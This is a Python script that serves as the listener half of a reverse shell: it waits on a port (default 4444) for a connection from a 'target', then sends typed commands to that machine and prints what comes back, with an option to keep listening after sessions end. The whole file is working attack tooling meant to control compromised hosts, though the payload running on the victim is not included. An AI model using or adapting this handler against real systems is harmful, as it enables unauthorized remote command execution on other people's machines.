import socket
import os
import argparse
import string
import time

def create_server(ip,port):
	server = socket.socket()
	server.settimeout(6)
	server.bind((ip,port))
	return server

def removeInvalid(resp):
	removed = ""
	for c in resp:
		if c in string.printable:
			removed += c
	return removed

parser = argparse.ArgumentParser(description="Payload listenner to receive connection from target")
parser.add_argument('-ip','--ip',help="your ip address to listen (default: 127.0.0.1)",action='store')
parser.add_argument('-p','--port',help="port to listen (default: 4444)",type=int)
parser.add_argument('-noexit','--noexit',help="continue listening if the connection is closed",action='store_true')
args = parser.parse_args()

if args.ip:
	ip = args.ip
else:
	ip = '127.0.0.1'

if args.port:
	port = int(args.port)
else:
	port = 4444

persistence = False
if args.noexit: persistence = True
server = connection = None

while True:
	try:
		print("[*] listening...")
		while 1:
			try:
				server = create_server(ip,port)
				server.listen(1)

				connection,host_info = server.accept()
				break
			except KeyboardInterrupt:
				exit(2)
			except Exception as er:
				server.close()
				time.sleep(1.5)

		connection.settimeout(100) # ***********************************
		print("[*] connected with %s"%host_info[0])

		while True:		
			shell = connection.recv(1024).decode("utf-8",'ignore')
			
			while 1:
				mycommand = input(shell)
				if mycommand!='' and mycommand!=' ' and mycommand!='\n':
					break

			connection.send(mycommand.encode("utf-8",'ignore'))
			response = removeInvalid(connection.recv(100000).decode("utf-8",'ignore'))
			'''
			connection.settimeout(1)
			response = ''
			try:
				while True:
					response += removeInvalid(connection.recv(1).decode("utf-8",'ignore').strip())
					if response.endswith(key_connection.decode()):
						break 
			except Exception as er:
				if str(er)!="timed out":
					raise Exception(er)
			
			'''
			if response=='[*] exit code':
				print("[*] exited")
				break

			print(response)
			if response=='[*] session ended': break
		if not persistence:
			break
	except KeyboardInterrupt: break
	except Exception as er:
		print("[!] error: "+str(er))
		if str(er)=="timed out":
			server.close()
			exit(2)
		break

if connection!=None:
	connection.close()
if server!=None:
	server.close()